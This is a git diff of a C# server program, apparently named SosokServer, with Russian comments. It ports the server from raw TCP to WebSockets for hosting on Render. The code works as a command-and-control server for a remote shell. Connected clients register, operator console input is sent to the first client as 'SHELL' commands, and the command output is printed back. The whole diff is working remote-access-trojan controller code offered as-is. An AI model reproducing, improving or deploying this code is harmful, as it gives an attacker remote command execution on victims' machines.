@@ -3,7 +3,6 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
-using System.Net.Sockets;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
@@ -23,54 +22,67 @@ namespace SosokServer
 
     class Program
     {
-        static Dictionary<string, TcpClient> _clients = new();
+        static Dictionary<string, WebSocketHandler> _clients = new();
 
         static async Task Main(string[] args)
         {
-            // Читаем порт из переменной окружения (Render подставляет свой), 
-            // если её нет — используем 6606
             int port = int.Parse(Environment.GetEnvironmentVariable("PORT") ?? "6606");
-            TcpListener listener = new TcpListener(IPAddress.Any, port);
+            string prefix = $"http://*:{port}/";
+
+            HttpListener listener = new HttpListener();
+            listener.Prefixes.Add(prefix);
             listener.Start();
-            Console.WriteLine($"=== СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port} ===");
+            Console.WriteLine($"=== WS СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port} ===");
 
             _ = Task.Run(ReadConsoleCommands);
 
             while (true)
             {
-                TcpClient client = await listener.AcceptTcpClientAsync();
-                _ = Task.Run(() => HandleClient(client));
+                var context = await listener.GetContextAsync();
+                if (context.Request.IsWebSocketRequest)
+                {
+                    _ = Task.Run(() => HandleClient(context));
+                }
+                else
+                {
+                    context.Response.StatusCode = 400;
+                    context.Response.Close();
+                }
             }
         }
 
-        private static async Task HandleClient(TcpClient client)
+        private static async Task HandleClient(HttpListenerContext context)
         {
-            var stream = client.GetStream();
-            byte[] lenBuffer = new byte[4];
+            var wsContext = await context.AcceptWebSocketAsync(null);
+            var ws = wsContext.WebSocket;
+            var handler = new WebSocketHandler(ws);
+
+            var buffer = new byte[4096];
             try
             {
-                while (client.Connected)
+                while (ws.State == System.Net.WebSockets.WebSocketState.Open)
                 {
-                    await stream.ReadExactlyAsync(lenBuffer, 0, 4);
-                    int len = BitConverter.ToInt32(lenBuffer, 0);
-                    byte[] data = new byte[len];
-                    await stream.ReadExactlyAsync(data, 0, len);
+                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), System.Threading.CancellationToken.None);
+                    if (result.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
 
-                    var packet = Packet.Deserialize(Encoding.UTF8.GetString(data));
+                    string json = Encoding.UTF8.GetString(buffer, 0, result.Count);
+                    var packet = Packet.Deserialize(json);
+
                     if (packet == null) continue;
 
                     if (packet.Type == "INFO")
                     {
-                        _clients[packet.ClientId] = client;
-                        Console.WriteLine($"\n[+] Подключился клиент: {packet.ClientId} | {packet.Payload}\n> ");
+                        _clients[packet.ClientId] = handler;
+                        Console.WriteLine($"\n[+] Подключился: {packet.ClientId} | {packet.Payload}\n> ");
                     }
                     else if (packet.Type == "RESP")
                     {
-                        Console.WriteLine($"\n[{packet.ClientId}] Ответ ({packet.Action}):\n{packet.Payload}\n> ");
+                        Console.WriteLine($"\n[{packet.ClientId}] {packet.Action}:\n{packet.Payload}\n> ");
                     }
                 }
             }
-            catch { Console.WriteLine("\n[-] Клиент отключился.\n> "); }
+            catch { Console.WriteLine("\n[-] Отключился.\n> "); }
+            finally { ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "", System.Threading.CancellationToken.None); }
         }
 
         private static async Task ReadConsoleCommands()
@@ -79,35 +91,38 @@ namespace SosokServer
             {
                 Console.Write("> ");
                 string? input = Console.ReadLine();
+
+                // КРИТИЧЕСКИЙ ФИКС: Если ввода нет (Render), не уходим в бесконечный цикл
+                if (input == null)
+                {
+                    await Task.Delay(1000);
+                    continue;
+                }
+
                 if (string.IsNullOrWhiteSpace(input)) continue;
 
                 if (_clients.Count == 0)
                 {
-                    Console.WriteLine("[!] Нет подключенных клиентов.");
-                    continue;
+                    continue; // Не спамим в логи, просто ждем
                 }
 
-                var targetClient = _clients.Values.First();
+                var target = _clients.Values.First();
                 var packet = new Packet { Type = "CMD", Action = "SHELL", Payload = input };
-
-                string json = packet.Serialize();
-                byte[] data = Encoding.UTF8.GetBytes(json);
-                byte[] len = BitConverter.GetBytes(data.Length);
-
-                try
-                {
-                    _ = Task.Run(async () =>
-                    {
-                        var stream = targetClient.GetStream();
-                        await stream.WriteAsync(len, 0, len.Length);
-                        await stream.WriteAsync(data, 0, data.Length);
-                    });
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"[!] Ошибка отправки: {ex.Message}");
-                }
+                await target.SendAsync(packet);
             }
+        }
+    }
+
+    public class WebSocketHandler
+    {
+        private System.Net.WebSockets.WebSocket _ws;
+        public WebSocketHandler(System.Net.WebSockets.WebSocket ws) { _ws = ws; }
+
+        public async Task SendAsync(Packet packet)
+        {
+            string json = packet.Serialize();
+            byte[] data = Encoding.UTF8.GetBytes(json);
+            await _ws.SendAsync(new ArraySegment<byte>(data), System.Net.WebSockets.WebSocketMessageType.Text, true, System.Threading.CancellationToken.None);
         }
     }
 }
